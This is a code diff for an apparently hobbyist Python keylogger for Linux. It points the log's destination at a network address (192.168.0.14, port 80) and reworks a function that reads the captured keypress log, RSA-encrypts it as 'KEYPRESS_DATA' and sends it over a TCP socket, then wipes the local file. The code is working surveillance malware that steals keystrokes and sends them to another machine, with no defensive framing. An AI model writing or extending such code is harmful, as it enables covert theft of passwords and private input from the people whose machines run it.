@@ -16,7 +16,7 @@ Compiled with XYZ for ease of use in demonstrations.
 Written by mowemcfc (jcartermcfc@gmail.com) starting 12/06/2020
 """
 
-return_addr = ("localhost", 80) # This port may not always be open
+return_addr = ("192.168.0.14", 80) # This port may not always be open
                                 # TODO: check multiple ports? configure host for this too
 logfile_name = ".log.txt"
 
@@ -76,25 +76,23 @@ def send_logfile(sock, pub_key):
     with open(logfile_name, "r+") as outf: # read/write mode
         data = ''.join(outf.readlines())
 
-        out_packet = Packet()
-        out_packet.type = "KEYPRESS_DATA"
-        out_packet.data = data
-
-        out_packet_string = json.dumps(out_packet.__dict__)
-        out_packet_bytes = out_packet_string.encode()
-
-        out_packet_cipher = pub_key.encrypt(
-            out_packet_bytes,
-            padding.OAEP(
-                mgf=padding.MGF1(algorithm=hashes.SHA256()),
-                algorithm=hashes.SHA256(),
-                label=None
-            )
-        )
-
-        print(out_packet_cipher)
-
         if data:
+            out_packet = Packet()
+            out_packet.type = "KEYPRESS_DATA"
+            out_packet.data = data
+
+            out_packet_string = json.dumps(out_packet.__dict__)
+            out_packet_bytes = out_packet_string.encode()
+
+            out_packet_cipher = pub_key.encrypt(
+                out_packet_bytes,
+                padding.OAEP(
+                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                    algorithm=hashes.SHA256(),
+                    label=None
+                )
+            )
+            
             sock.sendall(out_packet_cipher)
 
         outf.truncate(0)
@@ -160,8 +158,8 @@ Struct format {struct input_event} is as follows (for 64bit linux systems):
         long int tv_sec
         long int tv_sec
         __u16 type;
-	    __u16 code;
-	    __s32 value;
+        __u16 code;
+        __s32 value;
     }
 """
 # TODO: encrypt outgoing data
@@ -200,17 +198,6 @@ def read_cfile(cfile_path, device_file):
             except:
                 traceback.print_exc()
                 pass
-
-"""
-Establishes TCP connection with host computer, takes (HOST, PORT) tuple as input
-"""
-# Let's leave this to work with only local devices for now
-# TODO: configure this to work with remote computers, requires particular configurations on local network first
-def establish_return_conn():
-    
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(RETURN_ADDR)
-
 
 """
 Creates file pointers device_file (for keypress reading) and creates logfile for writing 
